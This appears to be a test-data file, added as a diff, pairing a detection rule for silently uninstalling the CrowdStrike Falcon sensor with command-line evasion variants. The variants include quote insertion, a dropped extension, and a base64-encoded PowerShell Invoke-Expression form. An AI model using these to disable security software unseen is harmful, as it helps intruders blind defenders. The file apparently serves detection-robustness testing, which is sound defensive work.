@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_uninstall_crowdstrike_falcon_0",
+  "original_command": "\\WindowsSensor.exe /uninstall /quiet",
+  "evasions": {
+    "insertion": "\\WindowsSensor.exe /uninstall /\"q\"\"u\"\"i\"\"e\"\"t\"",
+    "substitution": "\\WindowsSensor.exe /uninstall /quiet #substitution",
+    "omission": "\\WindowsSensor /uninstall /quiet",
+    "reordering": "\\WindowsSensor.exe /uninstall /quiet",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XFdpbmRvd3NTZW5zb3IuZXhlIC91bmluc3RhbGwgL3F1aWV0')) | Invoke-Expression\" "
+  }
+}
